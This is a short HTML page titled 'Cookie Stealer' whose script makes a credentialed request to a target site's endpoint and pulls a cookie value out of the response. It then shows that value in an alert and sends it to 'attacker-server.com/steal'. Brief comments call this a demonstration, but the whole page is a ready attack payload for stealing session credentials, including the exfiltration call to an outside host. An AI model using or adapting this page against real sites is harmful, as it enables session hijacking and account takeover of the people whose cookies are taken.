<!DOCTYPE html>
<html>
<head>
<title>Cookie Stealer</title>
</head>
<body>
<script>
fetch('https://vulnerable-application.com/sensitive-endpoint', {
  credentials: 'include'
})
.then(response => response.text())
.then(data => {
  // Extract the cookie from the response (this will vary)
  // For example, if the cookie is in the response body:
  const cookie = data.match(/cookie=([^;]+)/)[1];

  alert('Stolen Cookie: ' + cookie);

  // Send the cookie to the attacker's server (for demonstration)
  fetch('https://attacker-server.com/steal?cookie=' + cookie);
});
</script>
</body>
</html>
